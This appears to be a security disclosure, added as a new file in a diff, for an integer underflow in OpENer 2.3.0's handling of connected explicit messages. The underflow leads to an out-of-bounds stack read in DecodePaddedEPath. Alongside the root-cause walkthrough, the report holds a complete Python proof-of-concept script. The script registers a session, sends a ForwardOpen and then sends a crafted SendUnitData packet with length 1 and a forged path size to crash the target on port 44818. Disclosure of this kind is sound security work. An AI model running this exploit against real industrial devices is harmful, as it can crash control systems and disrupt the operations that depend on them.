@@ -1,0 +1,82 @@
+issue #568
+
+Vulnerability Description
+
+OpENer 2.3.0 (master branch up to commit 76b95cf) is vulnerable to a severe memory corruption issue caused by an integer underflow in the processing of connected explicit messages (SendUnitData).
+
+Although a previously reported vulnerability identified an out-of-bounds read in DecodePaddedEPath via Unconnected messages (SendRRData), I have discovered a distinct Integer Underflow vulnerability in the Connected message path. When parsing a connected data item, the length is blindly decremented by 2 (length - 2) without checking if the length is at least 2. An attacker can intentionally provide a length of 1, resulting in an integer underflow that produces a negative length.
+
+This negative length bypasses downstream size validations due to implicit unsigned conversions, allowing an attacker to supply a forged path_size that causes DecodePaddedEPath to read wildly out of bounds, resulting in a Stack Buffer Overflow.
+
+Root Cause
+
+The root cause is an unsafe subtraction operation without bounds checking, which leads to an integer underflow.
+
+Integer Underflow: In source/src/enet_encap/cpf.c, NotifyConnectedCommonPacketFormat processes a connected data item and calls NotifyMessageRouter:
+return_value = NotifyMessageRouter(buffer,
+                                   g_common_packet_format_data_item.data_item.length - 2, // <--- Underflow here if length < 2
+                                   &message_router_response, ...);
+If the attacker sends a SendUnitData payload where length = 1, 1 - 2 results in -1.
+Propagating the Negative Length: The -1 is passed down to CreateMessageRouterRequestStructure in source/src/cip/cipmessagerouter.c as data_length, where it is further decremented:
+data_length--; // -1 becomes -2
+Bypassed Bounds Check: After DecodePaddedEPath returns, there is a check:
+if(number_of_decoded_bytes > data_length)
+Since number_of_decoded_bytes is a size_t (unsigned), the negative data_length (-2) is implicitly cast to a massive unsigned value (e.g., 4294967294), permanently bypassing the check.
+Triggering OOB Read: Because the size check is nullified, an attacker can append a forged, extremely large path_size to the payload. DecodePaddedEPath will trust this size and continuously read from the stack, overrunning the incoming_message buffer.
+
+PoC
+
+import socket, struct, sys
+
+def send_req(sock, cmd, session, payload):
+    hdr = struct.pack("<HHII", cmd, len(payload), session, 0) + b"\x00"*12
+    sock.sendall(hdr + payload)
+    return sock.recv(1024)
+
+def poc(host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(2.0)
+    try:
+        sock.connect((host, port))
+    except Exception as e:
+        print(f"[-] Connect failed: {e}")
+        return
+
+    print("[+] 1. Registering Session...")
+    resp = send_req(sock, 0x65, 0, struct.pack("<HH", 1, 0))
+    if not resp or len(resp) < 24:
+        print("[-] Registration failed.")
+        return
+    session = struct.unpack("<I", resp[4:8])[0]
+    print(f"[+] Session ID: 0x{session:08x}")
+
+    print("[+] 2. Sending ForwardOpen...")
+    cip_fo = (
+        b"\x54\x02\x20\x06\x24\x01\x07\xf9\xBB\x70\x00\x80\xB9\x71\xFE\x80"
+        b"\x01\x70\x4D\x00\x3E\xB2\x4C\xD2\x00\x00\x00\x00\x00\x12\x7A\x00"
+        b"\xF4\x43\x00\x12\x7A\x00\xF4\x43\xA3\x02\x20\x02\x24\x01"
+    )
+    cpf_fo = struct.pack("<HHHHH", 2, 0, 0, 0x00B2, len(cip_fo)) + cip_fo
+    resp = send_req(sock, 0x6F, session, b"\x00"*6 + cpf_fo)
+
+    idx = resp.find(b"\xD4\x00\x00\x00")
+    if idx == -1:
+        print("[-] ForwardOpen failed.")
+        return
+    conn_id = struct.unpack("<I", resp[idx+4:idx+8])[0]
+    print(f"[+] Got Connection ID: 0x{conn_id:08x}")
+
+    print("[+] 3. Sending trigger (SendUnitData, length=1, big path_size)...")
+    tail = b"\x41\x0e\xfa" + b"\x20\x02" * 232
+    cpf_trigger = (
+        struct.pack("<HHHI", 3, 0x00A1, 4, conn_id) +
+        struct.pack("<HH", 0x00B1, 1) + b"\x00" + tail
+    )
+    try:
+        send_req(sock, 0x70, session, b"\x00"*6 + cpf_trigger)
+        print("[+] Trigger sent. If ASAN caught it, OpENer will crash.")
+    except Exception as e:
+        print(f"[*] Exception (expected if crashed): {e}")
+
+if __name__ == "__main__":
+    poc(sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1", 44818)
